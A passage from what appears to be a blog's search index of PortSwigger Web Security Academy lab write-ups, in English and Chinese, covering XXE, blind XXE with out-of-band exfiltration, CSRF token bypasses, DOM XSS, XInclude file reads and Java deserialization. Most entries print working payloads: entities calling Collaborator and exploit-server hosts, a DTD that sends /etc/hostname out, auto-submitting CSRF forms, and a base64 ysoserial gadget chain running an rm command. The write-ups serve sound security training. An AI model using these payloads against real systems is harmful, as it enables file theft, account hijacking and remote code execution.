\u0026lt;/stockCheck\u0026gt; ::: So\u0026hellip;, we can use out-of-band server try to leak some information\nExp # Use Burp Collaborator And copy the collaborator\u0026rsquo;s payloads :::spoiler Payload\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE stockCheck [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://s92t6q0ljljd7fttguns4mrdy44wsl.burpcollaborator.net\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; \u0026amp;xxe; \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; :::\nResult :::spoiler Success Screenshot :::\nReference # Lab: Blind XXE with out-of-band interaction XXE Lab Breakdown: Blind XXE with out-of-band interaction\n"},{"id":132,"href":"/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/","title":"Lab: Blind XXE with out-of-band interaction via XML parameter entities","section":"Securities","content":" Lab: Blind XXE with out-of-band interaction via XML parameter entities # tags: Portswigger Web Security Academy Web # Description: This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator\u0026rsquo;s default public server. Background # 這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在DOCTYPE中直接Reference，也就是利用%這個字元達到這個效果\nRecon # Create a new entity and reference it :::spoiler Payload \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe \u0026#34;test\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; \u0026amp;xxe; \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; ::: Seems not work properly\u0026hellip; Exp # Use Parameter Entity :::spoiler Payload \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE stockCheck [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;http://a1cby8s3b3bvzxlb8cfaw4jvqmwfk4.burpcollaborator.net\u0026#34;\u0026gt; %xxe; ]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 1 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; ::: :::spoiler Success Screenshot :::\nReference # XXE Lab Breakdown: Blind XXE with out-of-band interaction via XML parameter entities Lab: Blind XXE with out-of-band interaction via XML parameter entities\n"},{"id":133,"href":"/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/","title":"Lab: CSRF where token is not tied to user session","section":"Securities","content":" Lab: CSRF where token is not tied to user session # tags: Portswigger Web Security Academy Web # Description: This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren\u0026rsquo;t integrated into the site\u0026rsquo;s session handling system. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya Background # CSRF token should tied to user session otherwise, it\u0026rsquo;ll exploited by attacker.\nRecon # Username: wiener Session: l3IjqV4KRDAmncviJTvP80KK3RAHDJLG CSRF Token: u4wMMtIhhUoTlc2LgadJFNRKOZ6bFAZr\nUsername: carlos Session: Goc2H2lmU9Ki7Of4IcOWpE4XFNMWFslR CSRF Token: UGabdiPPbGaTLsSa8vOV6MfBEvi2nGQ3\nWhat if we change session or csrf_token? It seems work properly which means the user session didn\u0026rsquo;t tie with unique csrf_token\nExp # The csrf token should be altered to another token that was intercepted by Burp Suite which means this token haven\u0026rsquo;t sent it. So, we can altered a package to forge another user to achieve CSRF. Exploit Payload:\n\u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;https://0a5200320345733f806803640046007d.web-security-academy.net/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;danger\u0026amp;#64;gmail\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;u4wMMtIhhUoTlc2LgadJFNRKOZ6bFAZr\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::spoiler Success Screenshot :::\nReference # Lab: CSRF where token is not tied to user session - write up\n"},{"id":134,"href":"/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/","title":"Lab: CSRF where token is tied to non-session cookie","section":"Securities","content":" Lab: CSRF where token is tied to non-session cookie # tags: Portswigger Web Security Academy Web # Description: This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren\u0026rsquo;t fully integrated into the site\u0026rsquo;s session handling system.\nGoal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya\nHint:\nRecon # Username: wiener Session: XdagGBS9LPa7P1t3m5sxhxNdGNSF567a CSRF Key: liMgrTpwX5psfFRMCHyzuuH6GDT0va5v CSRF Token: ZZYoEyE0OQqp1rvb6XCgs4Uz9us4OCgG\nSomething interesting: when I logout and re-login again, the session changed and the others data are the same Username: carlos Session: eblGI5f9PddGlEpYdJvsIUe6chNkLjrd CSRF Key: liMgrTpwX5psfFRMCHyzuuH6GDT0va5v $\\to$ The same with wiener CSRF Token: ZZYoEyE0OQqp1rvb6XCgs4Uz9us4OCgG $\\to$ The same with wiener\nExp # :::spoiler Success Screenshot\n:::\nReference # Writeup: CSRF where token is tied to non-session cookie @ PortSwigger Academy\n"},{"id":135,"href":"/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/","title":"Lab: CSRF where token validation depends on request method","section":"Securities","content":" Lab: CSRF where token validation depends on request method # tags: Portswigger Web Security Academy Web # Description: This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address. You can log in to your own account using the following credentials: wiener:peter Recon # Login and update email to trace the package Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below: We can notice that the carried data including csrf_token\nAccording to 从0到1完全掌握 CSRF and CSDN write up :::info We know that using some technique can bypass this protection $\\to$ 1. Delete csrf_token data 2. change POST method to GET method\nIn this lab, we use the 2nd method to bypass CSRF ::: You can see that the response status is 302 which means it\u0026rsquo;s a good way to forge a CSRF package\nExp - Change POST to GET to bypass CSRF # Follow the self-created package at previous lab Exploit Payload:\n\u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;https://0a9700ef04043a66801b0d0e00d10084.web-security-academy.net/my-account/change-email?email=bernie6401%40gmail.com\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;danger\u0026amp;#64;gmail\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::spoiler Success Screenshot :::\nReference # 从0到1完全掌握 CSRF\n"},{"id":136,"href":"/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/","title":"Lab: CSRF where token validation depends on token being present","section":"Securities","content":" Lab: CSRF where token validation depends on token being present # tags: Portswigger Web Security Academy Web # Description: This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer\u0026rsquo;s email address. You can log in to your own account using the following credentials: wiener:peter Recon # Login and update email to trace the package It\u0026rsquo;s very similar with previous lab $\\to$ it contained CSRF_token as its carried data: Try to use 1st method to bypass It seems can work properly.\nExp - Delete CSRF_token directly to bypass # Actually, this is totally the same with the first lab\u0026rsquo;s payload Exploit Payload:\n\u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;https://0aa70059042bf55d80101c7a00930051.web-security-academy.net/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;danger\u0026amp;#64;gmail\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::spoiler Success Screenshot :::\nReference # Lab: CSRF where token validation depends on token being present:CSRF 从0到1完全掌握 CSRF\n"},{"id":137,"href":"/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/","title":"Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element","section":"Securities","content":" Lab: DOM XSS in document.write sink using source location.search inside a select element # tags: Portswigger Web Security Academy Web # Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. Recon # Find the injection place I used string search to find location.search in each sub-page source. Here is the interesting code: :::spoiler Source Code ... \u0026lt;script\u0026gt; var stores = [\u0026#34;London\u0026#34;,\u0026#34;Paris\u0026#34;,\u0026#34;Milan\u0026#34;]; var store = (new URLSearchParams(window.location.search)).get(\u0026#39;storeId\u0026#39;); document.write(\u0026#39;\u0026lt;select name=\u0026#34;storeId\u0026#34;\u0026gt;\u0026#39;); if(store) { document.write(\u0026#39;\u0026lt;option selected\u0026gt;\u0026#39;+store+\u0026#39;\u0026lt;/option\u0026gt;\u0026#39;); } for(var i=0;i\u0026lt;stores.length;i++) { if(stores[i] === store) { continue; } document.write(\u0026#39;\u0026lt;option\u0026gt;\u0026#39;+stores[i]+\u0026#39;\u0026lt;/option\u0026gt;\u0026#39;); } document.write(\u0026#39;\u0026lt;/select\u0026gt;\u0026#39;); \u0026lt;/script\u0026gt; ... ::: Try type something about storeID as URL GET parameter Payload: /product?productId=1\u0026amp;storeId=abc You can see that this is a perfect injection place Exp # Payload: /product?productId=1\u0026amp;storeId=\u0026lt;script\u0026gt;alert(123);\u0026lt;/script\u0026gt; :::spoiler Success Screenshot :::\nReference # "},{"id":138,"href":"/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/","title":"Lab: Exploiting `XInclude` to retrieve files","section":"Securities","content":" Lab: Exploiting XInclude to retrieve files # tags: Portswigger Web Security Academy Web # Description: This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don\u0026rsquo;t control the entire XML document you can\u0026rsquo;t define a DTD to launch a classic XXE attack. Goal: To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn\u0026rsquo;t valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. Background # XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document\nTo perform an XInclude attack you need to reference the XInclude namespace and provide the path to the file that you wish to include\nFor example:\n\u0026lt;foo xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;xi:include parse=\u0026#34;text\u0026#34; href=\u0026#34;file:///etc/passwd\u0026#34;/\u0026gt;\u0026lt;/foo\u0026gt; 淺析xml之xinclude \u0026amp; xslt\nxinclude可以理解為xml include熟悉編譯腳本語言的一定熟知，像php的include，python和java的import都是可以進行檔案包含的。\nRecon # In this lab, the package did not contain the xml format data so I can\u0026rsquo;t control DTD to launch a classic XXE. Therefore, we can use xinclude? Exp # Just use the payload at background section and replace productID\u0026rsquo;s data to exploited payload. $\\to$\nproductId=\u0026lt;foo xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;xi:include parse=\u0026#34;text\u0026#34; href=\u0026#34;file:///etc/passwd\u0026#34;/\u0026gt;\u0026lt;/foo\u0026gt;\u0026amp;storeId=1 :::spoiler Success Screenshot :::\nReference # "},{"id":139,"href":"/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/","title":"Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD","section":"Securities","content":" Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD # tags: Portswigger Web Security Academy Web # Description: This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input but does not display the result. Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator\u0026rsquo;s default public server. Recon # Use the previous method :::spoiler Payload\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE stockCheck [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;http://d3hr4hyf51vbe69iuzp4czdzuq0ho6.burpcollaborator.net\u0026#34;\u0026gt; %xxe; ]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 1 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; ::: By using the previous method, we can not achieve our goal which is exfiltrating the host name of the server.\nA new method Refer to the hint, we can use the exploit server they provided.\nCopy the Collaborator Payload Complete Malicious Server Payload and Store \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/hostname\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM \u0026#39;http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfil; Complete Intercept Packet Payload Intercept the packet that you click Check stock button in arbitrary product page. Copy and paste your malicious server URL to YOUR-DTD-URL, e.g. https://exploit-{YOUR-RANDOM-URL}.exploit-server.net/exploit \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;YOUR-DTD-URL\u0026#34;\u0026gt; %xxe;]\u0026gt; Send packet and observe in Collaborator Exp - 通靈 # 完整的流程有點複雜，我自己的想法是暫停的封包會因為parameter entity的reference，而觸發%xxe而和malicious server產生互動，此時malicious server就可以利用%eval和%exfil讓SYSTEM \u0026quot;file:///etc/hostname\u0026quot;這個指令被執行，並且把結果當作Collaborator的GET參數回傳給Burp Suite，此時我們就可以在Burp Suite的Collaborator中看到hostname是甚麼了。\n:::spoiler Malicious Server Payload\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/hostname\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM \u0026#39;http://ehzsiicgj29cs7nj8035q0r08reh26.burpcollaborator.net/?x=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfil; ::: :::spoiler Packet Payload\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;https://exploit-0aae00dc044ebfc38406a3db012f0055.exploit-server.net/exploit\u0026#34;\u0026gt; %xxe;]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 1 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; ::: :::spoiler Success Screenshot :::\nReference # XXE Lab Breakdown: Exploiting blind XXE to exfiltrate data using a malicious external DTD\n"},{"id":140,"href":"/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/","title":"Lab: Exploiting blind XXE to retrieve data via error messages","section":"Securities","content":" Lab: Exploiting blind XXE to retrieve data via error messages # tags: Portswigger Web Security Academy Web # Description: This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input but does not display the result. Goal: To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD. Recon # This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)\nComplete Malicious Server Payload and Store\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM \u0026#39;file:///invalid/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfil; Complete Intercept Packet Payload Intercept the packet that you click Check stock button in arbitrary product page. Copy and paste your malicious server URL to YOUR-DTD-URL, e.g. https://exploit-{YOUR-RANDOM-URL}.exploit-server.net/exploit\n\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;YOUR-DTD-URL\u0026#34;\u0026gt; %xxe;]\u0026gt; Send packet!!!\nExp # :::spoiler Malicious Server Payload\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM \u0026#39;file:///invalid/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfil; ::: :::spoiler Intercept Packet Payload\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;https://exploit-0ad100a2040f8d8e821cce250179002c.exploit-server.net/exploit\u0026#34;\u0026gt; %xxe;]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 1 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; :::\n:::spoiler Success Screenshot :::\n"},{"id":141,"href":"/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/","title":"Lab: Exploiting Java deserialization with Apache Commons","section":"Securities","content":" Lab: Exploiting Java deserialization with Apache Commons # tags: Portswigger Web Security Academy Web # Description: This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don\u0026rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains. Goal: To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos\u0026rsquo;s home directory. You can log in to your own account using the following credentials: wiener:peter Background # ysoserial使用方法\nRecon # Exp # :::spoiler Payload\nrO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci%2F5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB%2BAAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo%2FpQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2BkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD%2F%2F%2F%2F%2FdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAABqzK%2Frq%2BAAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIyNjYzMTkyMzY4NzQ1AQAeTHlzb3NlcmlhbC9Qd25lcjI2NjMxOTIzNjg3NDU7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA%2FAAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr%2Bur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2